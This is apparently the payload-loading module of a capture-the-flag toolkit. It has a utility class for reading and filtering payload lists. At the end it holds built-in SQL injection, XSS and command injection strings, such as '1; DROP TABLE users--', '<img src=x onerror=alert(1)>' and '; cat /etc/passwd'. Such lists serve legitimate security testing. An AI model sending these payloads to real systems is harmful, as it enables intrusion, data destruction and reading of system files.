"""Payload loading utilities for CTF Toolkit."""

from pathlib import Path
from typing import Iterator, Optional
import re


class PayloadLoader:
    """Load payloads from files or strings."""

    @staticmethod
    def from_file(filepath: str | Path, encoding: str = "utf-8") -> list[str]:
        """
        Load payloads from a file.
        Supports newline-separated payloads.
        """
        path = Path(filepath)
        if not path.exists():
            raise FileNotFoundError(f"Payload file not found: {filepath}")

        payloads = []
        with open(path, "r", encoding=encoding, errors="ignore") as f:
            for line in f:
                line = line.rstrip("\n\r")
                if line and not line.startswith("#"):  # Skip empty lines and comments
                    payloads.append(line)
        return payloads

    @staticmethod
    def from_string(data: str, delimiter: str = "auto") -> list[str]:
        """
        Load payloads from a string.

        Args:
            data: String containing payloads
            delimiter: 'auto' (detect), 'newline', 'comma', or custom delimiter
        """
        if delimiter == "auto":
            # Detect delimiter: newline takes priority over comma
            if "\n" in data:
                delimiter = "\n"
            elif "," in data:
                delimiter = ","
            else:
                return [data.strip()] if data.strip() else []

        if delimiter == "newline":
            delimiter = "\n"
        elif delimiter == "comma":
            delimiter = ","

        payloads = []
        for item in data.split(delimiter):
            item = item.strip()
            if item and not item.startswith("#"):
                payloads.append(item)
        return payloads

    @staticmethod
    def from_file_lazy(filepath: str | Path, encoding: str = "utf-8") -> Iterator[str]:
        """
        Lazily load payloads from a file (memory efficient for large files).
        """
        path = Path(filepath)
        if not path.exists():
            raise FileNotFoundError(f"Payload file not found: {filepath}")

        with open(path, "r", encoding=encoding, errors="ignore") as f:
            for line in f:
                line = line.rstrip("\n\r")
                if line and not line.startswith("#"):
                    yield line

    @staticmethod
    def generate_range(start: int, end: int, prefix: str = "", suffix: str = "") -> list[str]:
        """
        Generate a range of numeric payloads.
        Example: generate_range(1, 10, "id=", "") -> ["id=1", "id=2", ..., "id=10"]
        """
        return [f"{prefix}{i}{suffix}" for i in range(start, end + 1)]

    @staticmethod
    def generate_wordlist(
        words: list[str],
        prefix: str = "",
        suffix: str = "",
        case_variations: bool = False
    ) -> list[str]:
        """
        Generate payloads from a wordlist with optional transformations.
        """
        results = []
        for word in words:
            base = f"{prefix}{word}{suffix}"
            results.append(base)

            if case_variations:
                results.append(f"{prefix}{word.lower()}{suffix}")
                results.append(f"{prefix}{word.upper()}{suffix}")
                results.append(f"{prefix}{word.capitalize()}{suffix}")

        return list(set(results))  # Remove duplicates

    @staticmethod
    def combine_payloads(*payload_lists: list[str]) -> list[str]:
        """
        Combine multiple payload lists.
        """
        combined = []
        for pl in payload_lists:
            combined.extend(pl)
        return combined

    @staticmethod
    def filter_payloads(
        payloads: list[str],
        include_pattern: Optional[str] = None,
        exclude_pattern: Optional[str] = None,
        max_length: Optional[int] = None,
        min_length: Optional[int] = None
    ) -> list[str]:
        """
        Filter payloads based on various criteria.
        """
        filtered = payloads

        if include_pattern:
            regex = re.compile(include_pattern)
            filtered = [p for p in filtered if regex.search(p)]

        if exclude_pattern:
            regex = re.compile(exclude_pattern)
            filtered = [p for p in filtered if not regex.search(p)]

        if max_length:
            filtered = [p for p in filtered if len(p) <= max_length]

        if min_length:
            filtered = [p for p in filtered if len(p) >= min_length]

        return filtered


# Built-in quick payloads
QUICK_SQLI_PAYLOADS = [
    "'",
    "\"",
    "' OR '1'='1",
    "' OR '1'='1'--",
    "' OR '1'='1'/*",
    "\" OR \"1\"=\"1",
    "' OR 1=1--",
    "' OR 1=1#",
    "admin'--",
    "') OR ('1'='1",
    "1' ORDER BY 1--",
    "1' UNION SELECT NULL--",
    "1; DROP TABLE users--",
    "' AND '1'='1",
    "' AND SLEEP(5)--",
    "'; WAITFOR DELAY '0:0:5'--",
]

QUICK_XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
    "<body onload=alert(1)>",
    "'><script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "<iframe src=\"javascript:alert(1)\">",
    "<input onfocus=alert(1) autofocus>",
    "<marquee onstart=alert(1)>",
]

QUICK_CMDI_PAYLOADS = [
    "; ls",
    "| ls",
    "& ls",
    "|| ls",
    "&& ls",
    "`ls`",
    "$(ls)",
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "; whoami",
    "| whoami",
    "& whoami",
    "; id",
    "| id",
]
